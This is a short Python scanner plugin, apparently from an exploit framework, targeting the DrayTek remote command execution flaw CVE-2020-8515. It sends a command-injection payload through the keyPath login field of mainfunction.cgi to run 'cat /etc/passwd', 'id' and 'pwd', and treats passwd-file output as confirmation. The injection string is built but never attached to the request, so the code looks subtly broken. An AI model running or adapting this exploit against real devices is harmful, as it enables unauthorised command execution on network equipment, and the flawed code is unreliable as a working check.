#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/exz2utSbA_-YXM5htd4lxA',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'DrayTek企业网络设备 远程命令执行 CVE-2020-8515',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  payload = 'cat /etc/passwd%26id%26pwd&loginUser=a&loginPwd=a'
  data = "action=login&keyPath=%27%0A%2fbin%2f{}%0A%27&loginUser=a&loginPwd=a".format(payload)
  target = '/cgi-bin/mainfunction.cgi'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret